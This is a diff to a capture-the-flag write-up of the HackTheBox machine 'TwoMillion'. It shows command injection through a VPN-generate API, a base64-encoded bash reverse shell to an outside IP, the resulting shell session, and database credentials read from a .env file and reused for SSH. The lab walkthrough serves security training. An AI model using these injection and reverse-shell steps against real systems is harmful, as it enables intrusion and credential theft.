@@ -1,5 +1,6 @@
 # TwoMillion
 
+## User flag
 
 Found in the api **http://2million.htb//js/inviteapi.min.js**
 
@@ -211,4 +212,66 @@ bmRvbjETMBEGA1UECgwKSGFja1RoZUJveDEMMAoGA1UECwwDVlBO
 Here we can inject terminal commands by adding e.g **;whoami;** to the data field``` curl -v -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=4u5vn9hphqotkiou0p8rhuvedc" --header "Content-Type: application/json" --data '{"username":"test;whoami;"}'``` which returns as: ```www-data``` very good.
 
 
+We want to inject a reverse shell the same way now: ```bash -i >& /dev/tcp/10.10.16.49/1234 0>&1```. Injecting it in plaintext like this did not work, so we'll encode it as base64 to avoid sanitization:
 
+```
+curl -v -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=4u5vn9hphqotkiou0p8rhuvedc" --header "Content-Type: application/json" --data '{"username":"test;echo CmJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNDkvMTIzNCAwPiYxCg== | base64 -d | bash;"}'
+```
+
+And we are in:
+
+```
+nc -l 1233 
+bash: cannot set terminal process group (1193): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@2million:~/html$ ls
+ls
+Database.php
+Router.php
+VPN
+assets
+controllers
+css
+fonts
+images
+index.php
+js
+views
+www-data@2million:~/html$ whoami
+whoami
+www-data
+www-data@2million:~/html$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@2million:~/html$ ls -a
+ls -a
+.
+..
+.env
+Database.php
+Router.php
+VPN
+assets
+controllers
+css
+fonts
+images
+index.php
+js
+views
+www-data@2million:~/html$ cat .env
+cat .env
+DB_HOST=127.0.0.1
+DB_DATABASE=htb_prod
+DB_USERNAME=admin
+DB_PASSWORD=SuperDuperPass123
+```
+
+We find some interesting credentials within the php .env file, we can use this to ssh into the admin account:
+
+```
+admin@2million:~$ ls
+CVE-2023-0386-main  user.txt
+```
+
+## Root flag
